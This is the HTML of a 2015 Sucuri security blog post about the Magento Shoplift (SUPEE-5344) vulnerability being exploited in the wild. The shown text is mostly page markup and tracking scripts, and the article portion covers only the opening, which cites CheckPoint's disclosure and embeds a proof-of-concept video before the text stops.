<!DOCTYPE html>
<html lang="en-US">
<head >
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Magento Shoplift (SUPEE-5344) Exploits in the Wild</title>
<meta name='robots' content='max-image-preview:large' />

<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://mashshare.net -->
<meta property="og:type" content="article" /> 
<meta property="og:title" content="Magento Shoplift (SUPEE-5344) Exploits in the Wild" />
<meta property="og:description" content="As warned a few days ago, the Magento Shoplift (SUPEE-5344) vulnerability details have been disclosed by the CheckPoint team. They show step by step how it can be exploited to take over a vulnerable Magento site.    They" />
<meta property="og:url" content="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html" />
<meta property="og:site_name" content="Sucuri Blog" />
<meta property="article:publisher" content="https://www.facebook.com/SucuriSecurity/" />
<meta property="article:published_time" content="2015-04-23T17:52:43-07:00" />
<meta property="article:modified_time" content="2015-07-30T18:20:21-07:00" />
<meta property="og:updated_time" content="2015-07-30T18:20:21-07:00" />
<!-- Open Graph Meta Tags generated by MashShare 3.8.1 - https://www.mashshare.net -->
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Magento Shoplift (SUPEE-5344) Exploits in the Wild">
<meta name="twitter:description" content="As warned a few days ago, the Magento Shoplift (SUPEE-5344) vulnerability details have been disclosed by the CheckPoint team. They show step by step how it can be exploited to take over a vulnerable Magento site.    They">
<meta name="twitter:site" content="@sucurisecurity">
<!-- Twitter Card generated by MashShare 3.8.1 - https://www.mashshare.net -->


<!-- This site is optimized with the Yoast SEO Premium plugin v12.5 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="We explore active attacks via our WAF logs, trying to exploit the Magento Shoplift vulnerability, coming from a specific group of cybercriminals."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html" />
<!-- / Yoast SEO Premium plugin. -->

<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Feed" href="https://blog.sucuri.net/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Comments Feed" href="https://blog.sucuri.net/comments/feed" />
<link rel="alternate" type="application/rss+xml" title="Sucuri Blog &raquo; Magento Shoplift (SUPEE-5344) Exploits in the Wild Comments Feed" href="https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html/feed" />
<!-- This site uses the Google Analytics by MonsterInsights plugin v7.10.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
<script type="text/javascript" data-cfasync="false">
	var mi_version         = '7.10.0';
	var mi_track_user      = true;
	var mi_no_track_reason = '';
	
	var disableStr = 'ga-disable-UA-4077922-18';

	/* Function to detect opted out users */
	function __gaTrackerIsOptedOut() {
		return document.cookie.indexOf(disableStr + '=true') > -1;
	}

	/* Disable tracking if the opt-out cookie exists. */
	if ( __gaTrackerIsOptedOut() ) {
		window[disableStr] = true;
	}

	/* Opt-out function */
	function __gaTrackerOptout() {
	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
	  window[disableStr] = true;
	}
	
	if ( mi_track_user ) {
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');

		__gaTracker('create', 'UA-4077922-18', 'auto');
		__gaTracker('set', 'forceSSL', true);
		__gaTracker('require', 'displayfeatures');
		__gaTracker('send','pageview');
	} else {
		console.log( "" );
		(function() {
			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
			var noopfn = function() {
				return null;
			};
			var noopnullfn = function() {
				return null;
			};
			var Tracker = function() {
				return null;
			};
			var p = Tracker.prototype;
			p.get = noopfn;
			p.set = noopfn;
			p.send = noopfn;
			var __gaTracker = function() {
				var len = arguments.length;
				if ( len === 0 ) {
					return;
				}
				var f = arguments[len-1];
				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason );
					return;
				}
				try {
					f.hitCallback();
				} catch (ex) {

				}
			};
			__gaTracker.create = function() {
				return new Tracker();
			};
			__gaTracker.getByName = noopnullfn;
			__gaTracker.getAll = function() {
				return [];
			};
			__gaTracker.remove = noopfn;
			window['__gaTracker'] = __gaTracker;
					})();
		}
</script>
<!-- / Google Analytics by MonsterInsights -->
<link rel='stylesheet' id='sucuri-blog-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/style.css?ver=1.2.0' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://blog.sucuri.net/wp-includes/css/dist/block-library/style.min.css?ver=6.0.1' type='text/css' media='all' />
<style id='global-styles-inline-css' type='text/css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel='stylesheet' id='select2-css'  href='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.css?ver=4.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='mashsb-styles-css'  href='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/css/mashsb.min.css?ver=3.8.1' type='text/css' media='all' />
<style id='mashsb-styles-inline-css' type='text/css'>
.mashsb-count {color:#cccccc;}[class^="mashicon-"] .text, [class*=" mashicon-"] .text{
    text-indent: -9999px !important;
    line-height: 0px;
    display: block;
    } 
    [class^="mashicon-"] .text:after, [class*=" mashicon-"] .text:after {
        content: "" !important;
        text-indent: 0;
        font-size:13px;
        display: block !important;
    }
    [class^="mashicon-"], [class*=" mashicon-"] {
        width:25%;
        text-align: center !important;
    }
    [class^="mashicon-"] .icon:before, [class*=" mashicon-"] .icon:before {
        float:none;
        margin-right: 0;
    }
    .mashsb-buttons a{
       margin-right: 3px;
       margin-bottom:3px;
       min-width: 0;
       width: 41px;
    }
    .onoffswitch, 
    .onoffswitch-inner:before, 
    .onoffswitch-inner:after 
    .onoffswitch2,
    .onoffswitch2-inner:before, 
    .onoffswitch2-inner:after  {
        margin-right: 0px;
        width: 41px;
        line-height: 41px;
    }#mashbar-header .mashsb-count { 
    display:none; 
}
</style>
<link rel='stylesheet' id='sucuriblog-google-fonts-css'  href='//fonts.googleapis.com/css?family=Open+Sans:300,400,400italic,700,600' type='text/css' media='all' />
<link rel='stylesheet' id='cookie-banner-css-css'  href='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/css/cookie-banner.css?ver=20200427' type='text/css' media='all' />
<script type='text/javascript' id='monsterinsights-frontend-script-js-extra'>
/* <![CDATA[ */
var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/blog.sucuri.net","hash_tracking":"false"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/google-analytics-premium/assets/js/frontend.min.js?ver=7.10.0' id='monsterinsights-frontend-script-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/facetwp-select2/select2/select2.min.js?ver=4.0.1' id='select2-js'></script>
<script type='text/javascript' id='mashsb-js-extra'>
/* <![CDATA[ */
var mashsb = {"shares":"392","round_shares":"1","animate_shares":"1","dynamic_buttons":"0","share_url":"https:\/\/blog.sucuri.net\/2015\/04\/magento-shoplift-supee-5344-exploits-in-the-wild.html","title":"Magento+Shoplift+%28SUPEE-5344%29+Exploits+in+the+Wild","image":null,"desc":"As\u00a0warned a few days ago, the Magento Shoplift (SUPEE-5344) vulnerability details have been disclosed by the CheckPoint team. They show step by step how it can be exploited to take over a vulnerable Magento site.\r\n\r\nThey \u2026","hashtag":"@sucurisecurity","subscribe":"link","subscribe_url":"http:\/\/sucuri.hs-sites.com\/subscribe-to-security","activestatus":"1","singular":"1","twitter_popup":"1","refresh":"1","nonce":"c1b7e23fe8","postid":"12483","servertime":"1659523604","ajaxurl":"https:\/\/blog.sucuri.net\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/plugins/mashsharer/assets/js/mashsb.min.js?ver=3.8.1' id='mashsb-js'></script>
<!--[if lt IE 9]>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/html5shiv.min.js?ver=3.7.3' id='html5shiv-js'></script>
<![endif]-->
<link rel="https://api.w.org/" href="https://blog.sucuri.net/wp-json/" /><link rel="alternate" type="application/json" href="https://blog.sucuri.net/wp-json/wp/v2/posts/12483" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.sucuri.net/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.sucuri.net/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='https://blog.sucuri.net/?p=12483' />


<!-- This site is optimized with the Schema plugin v1.7.9.4 - https://schema.press -->
<script type="application/ld+json">{"@context":"https:\/\/schema.org\/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sucuri.net\/2015\/04\/magento-shoplift-supee-5344-exploits-in-the-wild.html"},"url":"https:\/\/blog.sucuri.net\/2015\/04\/magento-shoplift-supee-5344-exploits-in-the-wild.html","headline":"Magento Shoplift (SUPEE-5344) Exploits in the Wild","datePublished":"2015-04-23T17:52:43-07:00","dateModified":"2015-07-30T18:20:21-07:00","publisher":{"@type":"Organization","@id":"https:\/\/blog.sucuri.net\/#organization","name":"Sucuri Blog","logo":{"@type":"ImageObject","url":"","width":600,"height":60}},"articleSection":"Magento Security","keywords":"Hacked Websites","description":"As warned a few days ago, the Magento Shoplift (SUPEE-5344) vulnerability details have been disclosed by the CheckPoint team. They show step by step how it can be exploited to take over a vulnerable Magento site. They have prepared the following video showing a Proof of Concept (PoC) in which","author":{"@type":"Person","name":"Daniel Cid","url":"https:\/\/blog.sucuri.net\/author\/dcid","description":"Daniel B. Cid is Founder of Sucuri and the VP of Engineering for the  GoDaddy Security Products group. He is also the founder of OSSEC and CleanBrowsing.  You can find more about Daniel on his site dcid.me or on Twitter: @danielcid","image":{"@type":"ImageObject","url":"https:\/\/secure.gravatar.com\/avatar\/df3ec5506ba59d2ed3b951b7057e97d0?s=96&d=mm&r=g","height":96,"width":96}}}</script>

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-4077922-18', 'auto');
  ga('require', 'linker');
  ga('linker:autoLink', ['ddecode.com', 'unmaskparasites.com', 'urlfind.org']);
  ga('send', 'pageview');
</script>

<script type="text/javascript">
(function(a,b,c,d,e,f,g){e['ire_o']=c;e[c]=e[c]||function(){(e[c].a=e[c].a||[]).push(arguments)};f=d.createElement(b);g=d.getElementsByTagName(b)[0];f.async=1;f.src=a;g.parentNode.insertBefore(f,g);})('//d.impactradius-event.com/A166802-5dda-4f98-aad8-1f58dbc8f1771.js','script','ire',document,window);
</script>
<script type='text/javascript'>/*<![CDATA[*/(function(n,d,c){d.setTime(d.getTime()+2592000000);c=(new RegExp('[?&]'+n+'=([^&#]*)','i')).exec(window.location.search);if(c=c?c[1]:null)document.cookie=n+'='+c+';expires='+d.toUTCString()+';domain=.sucuri.net;path=/';})('cjevent',new Date());/*]]>*/</script><!-- Tealium Universal Tag --><script type="text/javascript">(function(a,b,c,d){a='//tags.tiqcdn.com/utag/gpl/sucuri/prod/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a)})();</script><link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-32x32.png" sizes="32x32" />
<link rel="icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-180x180.png" />
<meta name="msapplication-TileImage" content="https://blog.sucuri.net/wp-content/uploads/2022/04/cropped-Sucuri_FavIcon_512x512-1-270x270.png" />
		<style type="text/css" id="wp-custom-css">
			#menu-item-17506{ background-color: #619f42;}
#menu-item-17506:hover {background-color:#478237}
#menu-item-17506 > a { color:#fff;}
.nav-primary {
 width: 80%;
}

.genesis-nav-menu {
 display:table;
}

.genesis-nav-menu .menu-item {
 float:none;
 display:table-cell;
 text-align:center;
 vertical-align:top;
}

.text-right {
 text-align:right !important;
}

.genesis-nav-menu .languages-sub-menu a {
 margin-right:0;
}

/* Blog Background Green Color Replace*/
#menu-item-17506 { background-color: #008673!important; }
.home.archive-post-grid .archive-featured-post:first-of-type { border-top: 8px solid #008673!important; }
.button { background-color: #008673!important; }
#sidebar-cta .widget { background-color: #008673!important; }
.fwp-load-more:focus, .fwp-load-more:hover, .load-more:focus, .load-more:hover {
    background-color: #008673!important;
}
.social-icons a::before {
    background-color: #008673!important;
}
.footer-widgets .social-icons a:focus::before, .footer-widgets .social-icons a:hover::before, .footer-widgets .button:focus, .footer-widgets .button:hover {
    background-color: #008673!important;
}	
.button { background-color: #008673!important; }

.footer-widgets .button:hover { background-color: #26BA9E!important; }		</style>
		</head>
<body class="post-template-default single single-post postid-12483 single-format-standard header-full-width content-sidebar"><div class="site-container"><ul class="genesis-skip-link"><li><a href="#genesis-nav-primary" class="screen-reader-shortcut"> Skip to primary navigation</a></li><li><a href="#genesis-content" class="screen-reader-shortcut"> Skip to content</a></li><li><a href="#genesis-sidebar-primary" class="screen-reader-shortcut"> Skip to primary sidebar</a></li><li><a href="#genesis-footer-widgets" class="screen-reader-shortcut"> Skip to footer</a></li></ul><header class="site-header" itemscope itemtype="https://schema.org/WPHeader"><div class="wrap"><div class="title-area"><p class="site-title" itemprop="headline"><a href="https://blog.sucuri.net/">Sucuri Blog</a></p><p class="site-description screen-reader-text" itemprop="description">Website Security News</p></div><nav class="nav-primary" aria-label="Main" itemscope itemtype="https://schema.org/SiteNavigationElement" id="genesis-nav-primary"><ul id="menu-header-navigation-ii" class="menu genesis-nav-menu menu-primary js-superfish"><li id="menu-item-17495" class="menu-item-products menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17495"><a href="https://sucuri.net/website-antivirus/signup" itemprop="url"><span itemprop="name">Products</span></a>
<ul class="sub-menu">
	<li id="menu-item-17496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17496"><a href="https://sucuri.net/website-security-platform/signup/" itemprop="url"><span itemprop="name">Website Security Platform</span></a></li>
	<li id="menu-item-17497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17497"><a href="https://sucuri.net/website-firewall/" itemprop="url"><span itemprop="name">Website Firewall (WAF)</span></a></li>
	<li id="menu-item-20814" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20814"><a href="https://sucuri.net/custom/enterprise/" itemprop="url"><span itemprop="name">Enterprise Website Security</span></a></li>
	<li id="menu-item-20815" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20815"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Multisite Solutions</span></a></li>
</ul>
</li>
<li id="menu-item-17498" class="menu-item-industry menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-17498"><a href="https://sucuri.net/website-security-platform/" itemprop="url"><span itemprop="name">Features</span></a>
<ul class="sub-menu">
	<li id="menu-item-17499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17499"><a href="https://sucuri.net/malware-detection-scanning/" itemprop="url"><span itemprop="name">Detection</span></a></li>
	<li id="menu-item-17500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17500"><a href="https://sucuri.net/website-hack-protection/" itemprop="url"><span itemprop="name">Protection</span></a></li>
	<li id="menu-item-17501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17501"><a href="https://sucuri.net/website-performance/" itemprop="url"><span itemprop="name">Performance</span></a></li>
	<li id="menu-item-19564" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19564"><a href="https://sucuri.net/website-malware-removal/" itemprop="url"><span itemprop="name">Response</span></a></li>
	<li id="menu-item-19911" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19911"><a href="https://sucuri.net/website-backups/" itemprop="url"><span itemprop="name">Backups</span></a></li>
</ul>
</li>
<li id="menu-item-19912" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-19912"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a>
<ul class="sub-menu">
	<li id="menu-item-19913" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19913"><a href="https://sucuri.net/custom/agency/" itemprop="url"><span itemprop="name">Agency Solutions</span></a></li>
	<li id="menu-item-19915" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19915"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a></li>
	<li id="menu-item-20816" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20816"><a href="https://sucuri.net/referral/" itemprop="url"><span itemprop="name">Referral Program</span></a></li>
	<li id="menu-item-19914" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19914"><a href="https://sucuri.net/ecommerce-website-security/" itemprop="url"><span itemprop="name">Ecommerce</span></a></li>
</ul>
</li>
<li id="menu-item-20817" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-20817"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Resources</span></a>
<ul class="sub-menu">
	<li id="menu-item-20818" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20818"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Guides</span></a></li>
	<li id="menu-item-20819" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20819"><a href="https://sucuri.net/webinars/" itemprop="url"><span itemprop="name">Webinars</span></a></li>
	<li id="menu-item-20820" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20820"><a href="https://sucuri.net/infographics/" itemprop="url"><span itemprop="name">Infographics</span></a></li>
	<li id="menu-item-20821" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20821"><a href="https://sitecheck.sucuri.net/" itemprop="url"><span itemprop="name">SiteCheck</span></a></li>
	<li id="menu-item-20822" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20822"><a href="https://sucuri.net/reports/" itemprop="url"><span itemprop="name">Reports</span></a></li>
	<li id="menu-item-22570" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22570"><a href="https://sucuri.net/email-courses/" itemprop="url"><span itemprop="name">Email Courses</span></a></li>
</ul>
</li>
<li id="menu-item-17506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17506"><a href="https://sucuri.net/website-security-platform/help-now" itemprop="url"><span itemprop="name">Immediate Help</span></a></li>
<li id="menu-item-17509" class="menu-item-login menu-item menu-item-type-custom menu-item-object-custom menu-item-17509"><a href="https://dashboard.sucuri.net/login/" itemprop="url"><span itemprop="name">Login</span></a></li>
</ul></nav><button id="responsive-menu" role="button" aria-controls="genesis-nav-primary" aria-pressed="false"><span class="screen-reader-text">Menu</span></button></div></header><div class="site-inner"><div class="wrap"><div class="content-sidebar-wrap"><main class="content" id="genesis-content"><article class="post-12483 post type-post status-publish format-standard category-magento-security category-vulnerability-disclosure tag-hacked-websites entry"><header class="entry-header"><h1 class="entry-title">Magento Shoplift (SUPEE-5344) Exploits in the Wild</h1>
<p class="entry-meta"><time class="entry-time" datetime="2015-04-23T17:52:43-07:00">April 23, 2015</time><span class="entry-author"><a href="https://blog.sucuri.net/author/dcid" class="entry-author-link" rel="author"><span class="entry-author-name">Daniel Cid</span></a></span></p></header><div class="entry-content"><aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2015%2F04%2Fmagento-shoplift-supee-5344-exploits-in-the-wild.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Magento%20Shoplift%20%28SUPEE-5344%29%20Exploits%20in%20the%20Wild&url=https://blog.sucuri.net/2015/04/magento-shoplift-supee-5344-exploits-in-the-wild.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--><p>As <a href="https://blog.sucuri.net/2015/04/critical-magento-shoplift-vulnerability-supee-5344-patch-immediately.html">warned</a> a few days ago, the Magento Shoplift (SUPEE-5344) vulnerability details have been <a href="http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/">disclosed</a> by the CheckPoint team. They show step by step how it can be exploited to take over a vulnerable Magento site.</p>
<p>They have prepared the following video showing a Proof of Concept (PoC) in which they create a fake coupon:</p>
<p><iframe src="https://www.youtube.com/embed/pnNWCLADBJc?rel=0&amp;showinfo=0" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></p>
